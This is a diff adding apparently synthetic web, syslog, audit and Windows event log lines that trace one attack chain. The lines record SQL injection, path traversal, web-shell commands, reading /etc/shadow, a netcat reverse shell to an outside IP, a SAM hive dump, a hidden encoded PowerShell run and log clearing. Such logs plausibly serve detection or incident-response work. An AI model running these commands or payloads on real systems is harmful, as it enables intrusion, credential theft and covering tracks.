@@ -1,0 +1,14 @@
+203.0.113.45 - - [22/Oct/2026:11:00:05 +0000] "GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 4512
+203.0.113.45 - - [22/Oct/2026:11:01:12 +0000] "GET /admin/config.php?file=../../../../etc/passwd HTTP/1.1" 403 812
+203.0.113.45 - - [22/Oct/2026:11:02:40 +0000] "POST /uploads/c99.php?cmd=whoami HTTP/1.1" 200 1280
+203.0.113.45 - - [22/Oct/2026:11:03:10 +0000] "GET /uploads/shell.php HTTP/1.1" 200 940
+Oct 22 11:05:01 dmz-web-01 sudo[3312]: www-data : TTY=pts/0 ; PWD=/var/www/uploads ; USER=root ; COMMAND=/bin/bash -c cat /etc/shadow
+type=EXECVE msg=audit(1729595120.221:910): argc=3 a0="/bin/sh" a1="-c" a2="nc -e /bin/sh 203.0.113.45 4444"
+Oct 22 11:07:44 internal-jump sshd[4410]: Failed password for invalid user svc_sql from 10.10.20.15 port 39102 ssh2
+2026-10-22T11:10:00Z EventID=4625 User=Administrator SourceIP=10.10.20.15 Process=winlogon.exe CommandLine="LogonType=10"
+2026-10-22T11:12:15Z EventID=4688 User=CORP\svc_sql SourceIP=10.10.20.15 Process=cmd.exe CommandLine="cmd.exe /c net group \"Domain Admins\" /domain"
+2026-10-22T11:14:30Z EventID=4688 User=CORP\svc_sql SourceIP=10.10.20.15 Process=powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgA"
+2026-10-22T11:16:05Z EventID=4688 User=SYSTEM SourceIP=10.10.20.15 Process=reg.exe CommandLine="reg.exe save HKLM\SAM C:\temp\sam.save"
+2026-10-22T11:18:20Z EventID=7045 User=SYSTEM SourceIP=10.10.20.15 Process=services.exe CommandLine="C:\Windows\Temp\ BeaconSvc.exe"
+2026-10-22T11:20:00Z EventID=1102 User=SYSTEM SourceIP=10.10.20.15 Process=eventvwr.exe CommandLine="Clear-EventLog -LogName Security"
+
